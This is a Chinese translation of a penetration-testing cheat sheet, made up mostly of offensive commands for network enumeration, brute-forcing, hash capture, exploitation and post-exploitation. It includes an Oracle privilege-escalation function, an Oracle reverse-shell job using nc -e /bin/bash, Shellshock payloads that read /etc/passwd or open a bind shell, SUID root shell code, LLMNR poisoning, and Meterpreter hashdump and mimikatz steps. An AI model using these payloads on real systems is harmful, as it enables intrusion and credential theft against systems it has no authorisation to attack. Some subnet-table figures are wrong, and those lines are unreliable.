# 渗透测试工具备忘录

**本文翻译自** [**Penetration Testing Tools Cheat Sheet** ](https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/) **。**

## 简介

渗透测试工具备忘录记录渗透测试时常用的命令，更深入的信息推荐参考特定工具的帮助文档或 [本站](https://highon.coffee/blog/) 其他备忘录。

本目录关注网络底层相关的渗透测试，除了少量sqlmap的命令和一些Web服务枚举外，基本不包含Web应用渗透测试的内容。关于Web应用测试，建议参考《黑客攻防技术宝典》，这本书不管是用作专门学习还是参考手册都是很棒的。

文中缺漏之处欢迎 [推特](https://twitter.com/Arr0way) 私戳。

### 更新日志：

17/02/2017 ：更新文章，增加VPN，DNS隧道，VLAN hopping（跳跃攻击） 等内容。

## 开始前

### 网络配置

#### 设置IP 地址

```text
ifconfig eth0 xxx.xxx.xxx.xxx/24
```

#### 子网划分

```text
ipcalc xxx.xxx.xxx.xxx/24 
ipcalc xxx.xxx.xxx.xxx 255.255.255.0
```

## 公开来源情报

### 被动信息收集

#### DNS

**WHOIS 枚举**

```text
whois domain-name-here.com
```

**查询DNS IP**

```text
dig a domain-name-here.com @nameserver
```

**查询MX记录**

```text
dig mx domain-name-here.com @nameserver
```

**用DIG 查询域传送**

```text
dig axfr domain-name-here.com @nameserver
```

## DNS 域传送

| 命令 | 解释 |
| :--- | :--- |
| `nslookup -> set type=any -> ls -d blah.com` | Windows DNS域传送 |
| `dig axfr blah.com @ns1.blah.com` | Linux DNS 域传送 |

### 邮件

#### Simply Email

使用Simply Email枚举所有所有网站（GitHub，目标站点等），配上代理或设置较长的访问间隔时间，这样就不会被Google发现是爬虫并用验证码拦住了。Simply Email还可以验证收集的邮件地址。

```text
git clone https://github.com/killswitch-GUI/SimplyEmail.git
./SimplyEmail.py -all -e TARGET-DOMAIN
```

### 半主动信息收集

#### 基本指纹识别

手动指纹识别/banner抓取

| 命令 | 解释 |
| :--- | :--- |
| `nc -v 192.168.1.1 25`  `telnet 192.168.1.1 25` | 通过显示banner识别版本和指纹 |

#### 使用NC抓取banner

```text
nc TARGET-IP 80
GET / HTTP/1.1
Host: TARGET-IP
User-Agent: Mozilla/5.0
Referrer: meh-domain
<enter>
```

### 主动信息收集

#### DNS 爆破

**DNSRecon**

| DNS Enumeration Kali - DNSRecon |
| :--- |
| root :~\# dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml |

#### 端口扫描

**Nmap命令**

更多命令，详见 [Nmap备忘录](https://highon.coffee/blog/nmap-cheat-sheet/) 。

基本Nmap 命令：

| 命令 | 解释 |  |
| :--- | :--- | :--- |
| `nmap -v -sS -A -T4 target` | 详细显示，syn探测，高速扫描，系统和服务版本信息，脚本扫描和路由跟踪 |  |
| `nmap -v -sS -p--A -T4 target` | 同上，且扫描所有TCP端口，耗时更长 |  |
| `nmap -v -sU -sS -p- -A -T4 target` | 同上，且扫描所有UDP端口，耗时巨长 |  |
| `nmap -v -p 445 --script=smb-check-vulns  --script-args=unsafe=1 192.168.1.X` | 扫描可能包含漏洞的SMB服务 |  |
| \` ls /usr/share/nmap/scripts/\* | grep ftp \` | 利用关键字搜索nmap脚本 |

别在外网采用`T4` 扫描，使用`TCP` 连接扫描时用`T2` 比较合适。`T4` 扫描用在低延迟高带宽的内部网络测试会更合适。但这也取决于目标设备，如果用`T4/T5` 扫他们，结果就可能不准确。总的来说，扫描越慢越好，也可以先快速扫描1000个目标方便上手测试，然后再慢慢扫其余的。

**Nmap UDP扫描**

```text
nmap -sU TARGET
```

**UDP 协议扫描器**

```text
git clone https://github.com/portcullislabs/udp-proto-scanner.git
```

扫描文件中IP地址的所有服务

```text
./udp-protocol-scanner.pl -f ip.txt
```

扫描特定UDP服务

```text
udp-proto-scanner.pl -p ntp -f ips.txt
```

**其他主机发现**

不使用nmap发现主机的方法：

| 命令 | 解释 |
| :--- | :--- |
| `netdiscover -r 192.168.1.0/24` | 利用子网的地址解析协议发现同网段的IP，MAC地址和MAC厂商 |

## 枚举和攻击网络服务

用于识别/枚举网络服务的工具。

### SAMB / SMB / Windows 域枚举

#### Samba枚举

**SMB枚举工具**

```text
nmblookup -A target
smbclient //MOUNT/share -I target -N
rpcclient -U "" target
enum4linux target
```

当然也可参考本站的 [nbtscan 的速查表](https://highon.coffee/blog/nbtscan-cheat-sheet/)

**SMB 版本指纹识别**

```text
smbclient -L //192.168.1.100
```

**寻找开放的SMB共享**

```text
nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.1.0/24
```

**枚举SMB用户**

```text
nmap -sU -sS --script=smb-enum-users -p U:137,T:139 192.168.11.200-254
```

```text
python /usr/share/doc/python-impacket-doc/examples/samrdump.py 192.168.XXX.XXX
```

RID循环（RID Cycling ）

```text
ridenum.py 192.168.XXX.XXX 500 50000 dict.txt
```

Metasploit的RID循环攻击模块

```text
use auxiliary/scanner/smb/smb_lookupsid
```

**手动测试空会话**

```text
Windows:
net use \\TARGET\IPC$ "" /u:""

Linux:
smbclient -L //192.168.99.131
```

**NBTScan unixwiz**

在Kali上安装使用：

```text
apt-get install nbtscan-unixwiz 
nbtscan-unixwiz -f 192.168.0.1-254 > nbtscan
```

#### LLMNR / NBT-NS欺骗

从网络中窃取凭证

**使用Metasploit进行 LLMNR / NetBIOS请求**

欺骗/毒化 LLMNR / NetBIOS请求：

```text
auxiliary/spoof/llmnr/llmnr_response
auxiliary/spoof/nbns/nbns_response
```

抓取哈希

```text
auxiliary/server/capture/smb
auxiliary/server/capture/http_ntlm
```

最后会得到NTLMv2 哈希，可以使用john或者hashcat破解。

**Responder.py**

你也可以选择使用 responder

```text
git clone https://github.com/SpiderLabs/Responder.git
python Responder.py -i local-ip -I eth0
```

注：整个渗透测试过程可以一直允许Responder.py

#### SNMP枚举工具

SNMP枚举工具有很多。

美化SNMP输出结果使易于阅读。

```text
apt-get install snmp-mibs-downloader download-mibs
echo "" > /etc/snmp/snmp.conf
```

| 命令 | 解释 |  |  |
| :--- | :--- | :--- | :--- |
| `snmpcheck -t 192.168.1.X -c public` \` snmpwalk -c public -v1 192.168.1.X 1 | grep hrSWRunName | cut -d __ -f  `<br />` snmpenum -t 192.168.1.X `<br />` onesixtyone -c names -i hosts \` | SNMP枚举 |

**SNMPv3枚举工具**

使用nmap识别SNMPv3服务器

```text
nmap -sV -p 161 --script=snmp-info TARGET-SUBNET
```

Rory McCune 的脚本可以帮助自动化枚举SNMPv3的用户名枚举。

```text
apt-get install snmp snmp-mibs-downloader
wget https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb
```

注意：下面的路径是Kali上Metasploit的SNMP v1和v2的攻击字典，更新的字典可以参考Daniel Miessler [在GitHub上的安全列表](https://github.com/danielmiessler/SecLists) 。

```text
/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt
```

#### 远程服务枚举

这已是老生常谈，但为了本文内容的全面还是包含如下。

`nmap -A` 会进行下面列举的所有远程服务的枚举，所以这里只是顺便提及。

**RSH 枚举**

**RSH运行命令**

```text
rsh <target> <command>
```

**MetasploitRSH 登陆扫描**

```text
auxiliary/scanner/rservices/rsh_login
```

**使用rusers显示已登陆用户**

```text
rusers -al 192.168.2.1
```

**使用rlogin扫描整个子网**

```text
rlogin -l <user> <target>
e.g rlogin -l root TARGET-SUBNET/24
```

#### 使用finger枚举

```text
finger @TARGET-IP
finger batman@TARGET-IP
```

**利用Solaris的bug显示所有已登录用户**

```text
finger 0@host  

SunOS: RPC services allow user enum:
$ rusers # users logged onto LAN

finger 'a b c d e f g h'@sunhost
```

#### rwho

使用nmap识别运行rwhod服务（513端口，UDP协议）的机器。

## TLS&SSL 测试

### testssl.sh

测试单一主机并将结果输出的HTML文件：

```text
./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U TARGET-HOST | aha > OUTPUT-FILE.html
```

## 漏洞评估

在Kali Rolling上安装OpenVAS 8

```text
apt-get update
apt-get dist-upgrade -y
apt-get install openvas
openvas-setup
```

确认openvas 正在运行：

```text
netstat -tulpn
```

通过`https://127.0.0.1:9392` 登陆openvas，密码是在安装时设置好的。

## 数据库渗透测试

攻击暴露在互联网上的数据库。

### Oracle

安装 oscanner：

```text
apt-get install oscanner
```

运行 oscanner：

```text
oscanner -s 192.168.1.200 -P 1521
```

#### Oracle TNS版本指纹识别

安装 tnscmd10g ：

```text
apt-get install tnscmd10g
```

识别：

```text
tnscmd10g version -h TARGET
nmap --script=oracle-tns-version
```

#### 爆破Oracle账户

验证默认账户

```text
 nmap --script=oracle-sid-brute 
 nmap --script=oracle-brute
```

对Oracle TNS 运行nmap脚本：

```text
nmap -p 1521 -A TARGET
```

#### Oracle权限提升

利用条件：

* Oracle必须暴露在互联网上
* 使用默认账户，如scott

简明流程：

* 创建函数
* 创建表 SYS.DUAL  的索引
* 刚刚建立的索引执行了SCOTT.DBA\_X 函数
* 函数是被SYS用户执行的，因为表 SYS.DUAL 属于SYS用户
* 创建具有DBA权限的账户

下面的展示使用SCOTT用户，但其他默认的Oracle用户也是可以的。

**使用NMAP NSE脚本验证oracle数据库中的默认账户：**

```text
nmap --script=oracle-sid-brute 
nmap --script=oracle-brute
```

使用脆弱账号登陆（假设你发现了一个）。

**确认一个oracle用户的权限级别**

```text
SQL> select * from session_privs; 

SQL> CREATE OR REPLACE FUNCTION GETDBA(FOO varchar) return varchar deterministic authid 
curren_user is 
pragma autonomous_transaction; 
begin 
execute immediate 'grant dba to user1 identified by pass1';
commit;
return 'FOO';
end;
```

**Oracle权限提升和访问DBA**

运行netcat，`netcat -nvlp 443` 。

```text
SQL> create index exploit_1337 on SYS.DUAL(SCOTT.GETDBA('BAR'));
```

**运行查询语句**

```text
SQL> Select * from session_privs;
```

这时你应该拥有一个DBA用户，可以重新运行上面的命令来验证自己是否拥有DBA特权。

**移除利用痕迹：**

```text
drop index exploit_1337;
```

**获取Oracle反弹shell：**

```text
begin
dbms_scheduler.create_job( job_name    => 'MEH1337',job_type    =>
    'EXECUTABLE',job_action => '/bin/nc',number_of_arguments => 4,start_date =>
    SYSTIMESTAMP,enabled    => FALSE,auto_drop => TRUE); 
dbms_scheduler.set_job_argument_value('rev_shell', 1, 'TARGET-IP');
dbms_scheduler.set_job_argument_value('rev_shell', 2, '443');
dbms_scheduler.set_job_argument_value('rev_shell', 3, '-e');
dbms_scheduler.set_job_argument_value('rev_shell', 4, '/bin/bash');
dbms_scheduler.enable('rev_shell'); 
end;
```

### MSSQL

枚举/发现

Nmap

```text
nmap -sU --script=ms-sql-info 192.168.1.108 192.168.1.156
```

Metasploit

```text
msf > use auxiliary/scanner/mssql/mssql_ping
```

#### 爆破 MSSQL登陆

```text
msf > use auxiliary/admin/mssql/mssql_enum
```

#### Metasploit MSSQL Shell

```text
msf > use exploit/windows/mssql/mssql_payload
msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp
```

## 网络

### Plink.exe 隧道

PuTTY Link 隧道

转发运程端口到本地地址：

```text
plink.exe -P 22 -l root -pw "1337" -R 445:127.0.0.1:445 REMOTE-IP
```

### 跳板（Pivoting）

#### SSH 跳板（ssh Pivoting）

```text
ssh -D 127.0.0.1:1010 -p 22 user@pivot-target-ip
```

需在`/etc/proxychains.conf` 添加sock4 `127.0.0.1 1010`

利用SSH跳板跨越网络

```text
ssh -D 127.0.0.1:1010 -p 22 user1@ip-address-1
```

需在`/etc/proxychains.conf` 添加sock4 `127.0.0.1 1010`

```text
proxychains ssh -D 127.0.0.1:1011 -p 22 user1@ip-address-2
```

在`/etc/proxychains.conf` 添加sock4 `127.0.0.1 1011`

#### Meterpreter Pivoting

### TTL 指纹识别

| 操作系统 | TTL 值 |
| :--- | :--- |
| Windows | `128` |
| Linux | `64` |
| Solaris | `255` |
| Cisco / Network | `255` |

### IPv4 速查

#### 各类IP的地址范围

| 类别 | IP 地址范围 |
| :--- | :--- |
| A类 | `0.0.0.0 - 127.255.255.255` |
| B类 | `128.0.0.0 - 191.255.255.255` |
| C类 | `192.0.0.0 - 223.255.255.255` |
| D类 | `224.0.0.0 - 239.255.255.255` |
| E类 | `240.0.0.0 - 255.255.255.255` |

#### IPv4私有地址

| 类别 | 范围 |
| :--- | :--- |
| A类私有地址 | `10.0.0.0 - 10.255.255.255` |
| B类私有地址 | `172.16.0.0 - 172.31.255.255` |
| C类私有地址 | `192.168.0.0 - 192.168.255.255` |
|  | `127.0.0.0 - 127.255.255.255` |

#### IPv4子网速查表

和渗透测试关系不太大，但确实很有用。

| CIDR | 十进制掩码 | 主机数量 |
| :--- | :--- | :--- |
| /31 | `255.255.255.254` | `1 Host` |
| /30 | `255.255.255.252` | `2 Hosts` |
| /29 | `255.255.255.249` | `6 Hosts` |
| /28 | `255.255.255.240` | `14 Hosts` |
| /27 | `255.255.255.224` | `30 Hosts` |
| /26 | `255.255.255.192` | `62 Hosts` |
| /25 | `255.255.255.128` | `126 Hosts` |
| /24 | `255.255.255.0` | `254 Hosts` |
| /23 | `255.255.254.0` | `512 Host` |
| /22 | `255.255.252.0` | `1022 Hosts` |
| /21 | `255.255.248.0` | `2046 Hosts` |
| /20 | `255.255.240.0` | `4094 Hosts` |
| /19 | `255.255.224.0` | `8190 Hosts` |
| /18 | `255.255.192.0` | `16382 Hosts` |
| /17 | `255.255.128.0` | `32766 Hosts` |
| /16 | `255.255.0.0` | `65534 Hosts` |
| /15 | `255.254.0.0` | `131070 Hosts` |
| /14 | `255.252.0.0` | `262142 Hosts` |
| /13 | `255.248.0.0` | `524286 Hosts` |
| /12 | `255.240.0.0` | `1048674 Hosts` |
| /11 | `255.224.0.0` | `2097150 Hosts` |
| /10 | `255.192.0.0` | `4194302 Hosts` |
| /9 | `255.128.0.0` | `8388606 Hosts` |
| /8 | `255.0.0.0` | `16777214 Hosts` |

### VLAN hopping（跳跃攻击）

使用nccgroup 的脚本简化攻击过程

```text
git clone https://github.com/nccgroup/vlan-hopping.git
chmod 700 frogger.sh
./frogger.sh
```

### VPN测试工具

识别VPN服务器

```text
./udp-protocol-scanner.pl -p ike TARGET(s)
```

扫描VPN服务器网段：

```text
./udp-protocol-scanner.pl -p ike -f ip.txt
```

#### IKEForce

使用IKEForce枚举或对 VPN 服务器进行字典攻击.

安装:

```text
pip install pyip
git clone https://github.com/SpiderLabs/ikeforce.git
```

使用IKEForce对IKE VPN 进行枚举：

```text
./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic
```

使用 IKEForce 爆破 IKE VPN:

```text
./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1
```

```text
ike-scan
ike-scan TARGET-IP
ike-scan -A TARGET-IP
ike-scan -A TARGET-IP --id=myid -P TARGET-IP-key
```

#### IKE 激进模式 PSK 破解

1. 验证VPN服务器
2. 使用 IKEForce 枚举来获得组ID
3. 使用 ike-scan 从IKE 终端抓取 PSK 哈希 
4. 使用 psk-crack 破解哈希

**Step 1: 验证IKE服务器**

```text
./udp-protocol-scanner.pl -p ike SUBNET/24
```

**Step 2:使用IKEForce枚举组名**

```text
./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic
```

**Step 3: 使用ike-scan抓取PSK哈希**

```text
ike-scan –M –A –n example_group -P hash-file.txt TARGET-IP
```

**Step 4: 使用psk-crack 破解PSK 哈希**

```text
psk-crack hash-file.txt
```

高级psk-crack 选项:

```text
pskcrack
psk-crack -b 5 TARGET-IPkey
psk-crack -b 5 --charset="01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" 192-168-207-134key
psk-crack -d /path/to/dictionary-file TARGET-IP-key
```

#### PPTP Hacking

验证PPTP服务 ，它以TCP协议在1723端口监听

**NMAP PPTP 指纹识别:**

```text
nmap –Pn -sV -p 1723 TARGET(S)
```

**PPTP字典攻击**

```text
thc-pptp-bruter -u hansolo -W -w /usr/share/wordlists/nmap.lst
```

### DNS 隧道

通过DNS传送数据来绕过防火墙。dns2cat支持和目标主机间 的上传和下载文件（数据或程序）操作。

#### 攻击机器：

安装:

```text
apt-get update
apt-get -y install ruby-dev git make g++
gem install bundler
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server
bundle install
```

运行dnscat2:

```text
ruby ./dnscat2.rb
dnscat2> New session established: 1422
dnscat2> session -i 1422
```

目标机器:

[https://downloads.skullsecurity.org/dnscat2/](https://downloads.skullsecurity.org/dnscat2/)

[https://github.com/lukebaggett/dnscat2-powershell/](https://github.com/lukebaggett/dnscat2-powershell/)

```text
dnscat --host <dnscat server_ip>
```

## BOF / Exploit

## Exploit 搜索

寻找枚举主机/服务的exp

| 命令 | 解释 |  |
| :--- | :--- | :--- |
| \`searchsploit windows 2003 | grep -i local\` | 从 exploit-db搜索EXP, 这里以WIndows2003本地提权为例 |
| `site:exploit-db.com exploit kernel <= 3` | 使用Google搜索exploit-db.com |  |
| `grep -R "W7" /usr/share/metasploit-framework/modules/exploit/windows/*` | 用grep搜索metasploit的模块——因为msf的搜索有点差劲。 |  |

### 搜索EXP

安装exploit-db的本地备份:

```text
 searchsploit –u
 searchsploit apache 2.2
 searchsploit "Linux Kernel"
 searchsploit linux 2.6 | grep -i ubuntu | grep local
```

### 在Kali上编译WIndows的exp

```text
wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download
wine mingw-get-setup.exe
select mingw32-base
cd /root/.wine/drive_c/windows
wget http://gojhonny.com/misc/mingw_bin.zip && unzip mingw_bin.zip
cd /root/.wine/drive_c/MinGW/bin
wine gcc -o ability.exe /tmp/exploit.c -lwsock32
wine ability.exe
```

### 交叉编译Exploits

```text
gcc -m32 -o output32 hello.c (32 bit)
gcc -m64 -o output hello.c (64 bit)
```

### 利用通用漏洞

#### 利用Shellshock漏洞

一个用来寻找和利用Shellshock漏洞的攻击

```text
git clone https://github.com/nccgroup/shocker
```

```text
./shocker.py -H TARGET  --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose
```

**cat file \(查看文件内容\)**

```text
echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc TARGET 80
```

**Shell Shock 运行bind shell**

```text
echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc TARGET 80
```

**Shell Shock 反弹shell**

```text
nc -l -p 443
```

## 简单的本地Web服务器

使用Python命令运行本地Web服务，在接受反向shell和攻击目标机器是很方便。

| 命令 | 解释 |
| :--- | :--- |
| `python -m SimpleHTTPServer 80` | 运行一个基本的 http 服务,接受反弹shell等情况下很棒 |
| `python3 -m http.server` | 运行一个基本的 Python3 http 服务 |
| `ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"` | 运行一个基本的ruby http 服务 |
| `php -S 0.0.0.0:80` | 运行一个基本的 PHP http 服务 |

## 挂载文件共享

怎样挂载 NFS / CIFS以进行 Windows 和Linux 的文件共享。

| 命令 | 解释 |
| :--- | :--- |
| `mount 192.168.1.1:/vol/share /mnt/nfs` | 挂载NFS共享到 `/mnt/nfs` |
| `mount -t cifs -o username=user,password=pass,domain=blah //192.168.1.X/share-name /mnt/cifs` | 挂载Windows CIFS / SMB 共享到 Linux 的 `/mnt/cifs` 。如果不直接在命令里带密码，可以在询问后输入，这样就不会在bash命令历史里存储明文密码 |
| `net use Z: \\win-server\share password  /user:domain\janedoe /savecred /p:no` | 使用命令行在Windows间挂载共享文件 |
| `apt-get install smb4k -y` | 在Kali上安装smb4k，方便从Linux的GUI查看SMB共享 |

## HTTP / HTTPS Web服务枚举

| 命令 | 解释 |
| :--- | :--- |
| `nikto -h 192.168.1.1` | 对目标使用 nikto 进行扫描 |
| `dirbuster` | 使用GUI配置，命令行不好使 |

## 数据包侦测

| 命令 | 解释 |
| :--- | :--- |
| `tcpdump tcp port 80 -w output.pcap -i eth0` | 将网卡eth0的80端口的流量导出到output.pcap |

## 用户名枚举

一些用来枚举目标系统用户名的手法。

### SMB 用户枚举

| 命令 | 解释 |
| :--- | :--- |
| `python /usr/share/doc/python-impacket-doc/examples/samrdump.py 192.168.XXX.XXX` | 枚举SMB用户 |
| `ridenum.py 192.168.XXX.XXX 500 50000 dict.txt` | 利用RID cycle枚举SMB用户 |

### SNMP 用户枚举

| COMMAND | DESCRIPTION |  |  |
| :--- | :--- | :--- | :--- |
| \`snmpwalk public -v1 192.168.X.XXX 1 | grep 77.1.2.25 | cut -d” “ -f4\` | 枚举 SNMP 用户 |
| `python /usr/share/doc/python-impacket-doc/examples/samrdump.py SNMP 192.168.X.XXX` | 枚举 SNMP 用户 |  |  |
| `nmap -sT -p 161 192.168.X.XXX/254 -oG snmp_results.txt (then grep)` | 使用nmap搜索SNMP服务器，然后用grep过滤输出 |  |  |

## 密码

### 字典

| 命令 | 解释 |
| :--- | :--- |
| `/usr/share/wordlists` | Kali 的字典存放路径 |

## 爆破服务

### 使用Hydra 爆破FTP

| 命令 | 解释 |
| :--- | :--- |
| `hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX ftp -V` | 使用Hydra 爆破FTP |

### 使用Hydra 爆破POP3

| COMMAND | DESCRIPTION |
| :--- | :--- |
| `hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX pop3 -V` | 使用Hydra 爆破POP3 |

### 使用Hydra 爆破SMTP

| COMMAND | DESCRIPTION |
| :--- | :--- |
| `hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp -V` | 使用Hydra 爆破SMTP |

使用 `-t` 限制并发连接数，如 `-t 15`

## 密码破解

渗透测试中用于密码破解的工具。

### John The Ripper - JTR

| 命令 | 解释 |
| :--- | :--- |
| `john --wordlist=/usr/share/wordlists/rockyou.txt hashes` | JTR 破解密码 |
| `john --format=descrypt --wordlist  /usr/share/wordlists/rockyou.txt hash.txt` | JTR 使用字典爆破解密 |
| `john --format=descrypt hash --show` | JTR 爆破解密 |

## Windows 渗透测试命令

See **Windows Penetration Testing Commands**.【待原文补充】

## Linux 渗透测试命令

参考本站的[Linux 命令速查表](https://highon.coffee/blog/linux-commands-cheat-sheet/) ，该表提供了很多有用的命令。

## 编译EXP

Some notes on compiling exploits.【待原文补充】

### 判断C代码适用于Windows平台还是Linux

通过`#include` 的文件来判定

| 命令 | 解释 |
| :--- | :--- |
| `process.h, string.h, winbase.h, windows.h, winsock2.h` | Windows平台代码 |
| `arpa/inet.h, fcntl.h, netdb.h, netinet/in.h,  sys/sockt.h, sys/types.h, unistd.h` | Linux平台代码 |

### 使用GCC编译Exploit

| 命令 | 解释 |
| :--- | :--- |
| `gcc -o exploit exploit.c` | GCC基本用法 |

### 在64位的Kali上用GCC编译32位的EXP

很方便地在64位的攻击机器上交叉编译32位的二进制文件。

| 命令 | 解释 |
| :--- | :--- |
| `gcc -m32 exploit.c -o exploit` | 在64位的Linux上交叉编译32位的二进制文件 |

### 在 Linux上编译可运行于Windows的exe文件

| COMMAND | DESCRIPTION |
| :--- | :--- |
| `i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe` | 在 Linux上生成Windows的exe |

## SUID 二进制

通常具有SUID的 C二进制文件要求以超级用户登陆shell，您可以按需更新UID / GID和shell。

下面是一些可用的shell：

### 运行 /bin/bash的SUID C Shell

```text
int main(void){
       setresuid(0, 0, 0);
       system("/bin/bash");
}
```

### 运行 /bin/sh的SUID C Shell

```text
int main(void){
       setresuid(0, 0, 0);
       system("/bin/sh");
}
```

### 构建 SUID Shell 二进制

```text
gcc -o suid suid.c
```

32位

```text
gcc -m32 -o suid suid.c
```

## 反向Shells

参考 [反向 Shell 速查表](https://highon.coffee/blog/reverse-shell-cheat-sheet/) 。

## TTY Shells

Tips / Tricks to spawn a TTY shell from a limited shell in Linux, useful for running commands like `su` from reverse shells.

一些模拟出TTY终端窗口以突破shell限制的技巧，便于从反向shell上执行类似 `su` 的特殊命令。

### 用Python模拟 TTY Shell的技巧

```text
python -c 'import pty;pty.spawn("/bin/bash")'
```

```text
echo os.system('/bin/bash')
```

### 用sh模拟交互式shell

```text
/bin/sh -i
```

### 用Perl模拟 TTY Shell

```text
exec "/bin/sh";
perl —e 'exec "/bin/sh";'
```

### 用Ruby模拟 TTY Shell

```text
exec "/bin/sh"
```

### 用Lua 模拟TTY Shell

```text
os.execute('/bin/sh')
```

### 从Vi模拟TTY Shell

```text
:!bash
```

### 用NMAP模拟TTY Shell

```text
!sh
```

## Metasploit 速查表

这是一个metasploit方便的速查手册。关于跳板技术可参看 [Meterpreter Pivoting](https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/) 。

### Meterpreter Payloads

### Windows 反向meterpreter payload

| 命令 | 解释 |
| :--- | :--- |
| `set payload windows/meterpreter/reverse_tcp` | Windows 反向tcp payload |

### Windows VNC Meterpreter payload

| 命令 | 解释 |
| :--- | :--- |
| ```set payload windows/vncinject/reverse_tcp``set ViewOnly false``` | Meterpreter Windows VNC Payload |

### Linux 反向Meterpreter payload

| 命令 | 解释 |
| :--- | :--- |
| `set payload linux/meterpreter/reverse_tcp` | Meterpreter Linux 反向Payload |

## Meterpreter速查表

有用的meterpreter 命令。

| 命令 | 解释 |
| :--- | :--- |
| `upload file c:\\windows` | Meterpreter上传文件到 Windows 目标 |
| `download c:\\windows\\repair\\sam /tmp` | Meterpreter 从 Windows 目标下载文件 |
| `execute -f c:\\windows\temp\exploit.exe` | Meterpreter 在目标机器上执行.exe文件——用来执行上传的exp很方便 |
| `execute -f cmd -c` | 创建新的cmd shell通道 |
| `ps` | Meterpreter显示进程 |
| `shell` | Meterpreter获取目标shell |
| `getsystem` | Meterpreter尝试提权 |
| `hashdump` | Meterpreter尝试导出目标机器上的哈希 |
| `portfwd add –l 3389 –p 3389 –r target` | Meterpreter端口转发 |
| `portfwd delete –l 3389 –p 3389 –r target` | Meterpreter删除端口转发 |

## 常用Metasploit 模块

最常用的metasploit 模块。

### 远程Windows Metasploit 模块\(exploits\)

| 命令 | 解释 |
| :--- | :--- |
| `use exploit/windows/smb/ms08_067_netapi` | MS08\_067 Windows 2k, XP, 2003 远程攻击 |
| `use exploit/windows/dcerpc/ms06_040_netapi` | MS08\_040 Windows NT, 2k, XP, 2003 远程攻击 |
| `use exploit/windows/smb/ms09_050_smb2_negotiate_func_index` | MS09\_050 Windows Vista SP1/SP2 和Server 2008 \(x86\) 远程攻击 |

### 本地Windows Metasploit 模块\(exploits\)

| 命令 | 解释 |
| :--- | :--- |
| `use exploit/windows/local/bypassuac` | 绕过 Windows 7 上的UAC |

### 辅助Metasploit 模块

| 命令 | 解释 |
| :--- | :--- |
| `use auxiliary/scanner/http/dir_scanner` | Metasploit HTTP 目录扫描 |
| `use auxiliary/scanner/http/jboss_vulnscan` | Metasploit JBOSS 漏扫 |
| `use auxiliary/scanner/mssql/mssql_login` | Metasploit MSSQL 认证扫描 |
| `use auxiliary/scanner/mysql/mysql_version` | Metasploit MSSQL 版本扫描 |
| `use auxiliary/scanner/oracle/oracle_login` | Metasploit Oracle 登陆模块 |

### Metasploit Powershell 模块

| 命令 | 解释 |
| :--- | :--- |
| `use exploit/multi/script/web_delivery` | Metasploit powershell payload c传送模块 |
| `post/windows/manage/powershell/exec_powershell` | Metasploit通过会话上传和执行 powershell脚本 |
| `use exploit/multi/http/jboss_maindeployer` | Metasploit JBOSS 部署 |
| `use exploit/windows/mssql/mssql_payload` | Metasploit MSSQL payload |

### Windows 后渗透Metasploit 模块

Windows Metasploit 提权模块。

| 命令 | 解释 |
| :--- | :--- |
| `run post/windows/gather/win_privs` | Metasploit 显示当前用户权限 |
| `use post/windows/gather/credentials/gpp` | Metasploit 提取 GPP 保存的密码 |
| `load mimikatz -> wdigest` | Metasplit 加载 Mimikatz |
| `run post/windows/gather/local_admin_search_enum` | 检查当前用户是否对域内其他机器有管理员权限 |
| `run post/windows/gather/smart_hashdump` | 自动化导出sam 文件，尝试提权等。 |

## ASCII表速查

对Web应用渗透测试很有用，或者你被困在火星而需要和NASA通信。（梗自《火星救援》）

| ASCII | 字符 |
| :--- | :--- |
| `x00` | Null Byte 空字节 |
| `x08` | BS  退格 |
| `x09` | TAB 水平制表符 |
| `x0a` | LF 换行 |
| `x0d` | CR 回车 |
| `x1b` | ESC |
| `x20` | SPC 空格 |
| `x21` | ! |
| `x22` | " |
| `x23` | \# |
| `x24` | $ |
| `x25` | % |
| `x26` | & |
| `x27` | \` |
| `x28` | \( |
| `x29` | \) |
| `x2a` | \* |
| `x2b` | + |
| `x2c` | , |
| `x2d` | - |
| `x2e` | . |
| `x2f` | / |
| `x30` | 0 |
| `x31` | 1 |
| `x32` | 2 |
| `x33` | 3 |
| `x34` | 4 |
| `x35` | 5 |
| `x36` | 6 |
| `x37` | 7 |
| `x38` | 8 |
| `x39` | 9 |
| `x3a` | : |
| `x3b` | ; |
| `x3c` | &lt; |
| `x3d` | = |
| `x3e` | &gt; |
| `x3f` | ? |
| `x40` | @ |
| `x41` | A |
| `x42` | B |
| `x43` | C |
| `x44` | D |
| `x45` | E |
| `x46` | F |
| `x47` | G |
| `x48` | H |
| `x49` | I |
| `x4a` | J |
| `x4b` | K |
| `x4c` | L |
| `x4d` | M |
| `x4e` | N |
| `x4f` | O |
| `x50` | P |
| `x51` | Q |
| `x52` | R |
| `x53` | S |
| `x54` | T |
| `x55` | U |
| `x56` | V |
| `x57` | W |
| `x58` | X |
| `x59` | Y |
| `x5a` | Z |
| `x5b` | \[ |
| `x5c` | \ |
| `x5d` | \] |
| `x5e` | ^ |
| `x5f` | \_ |
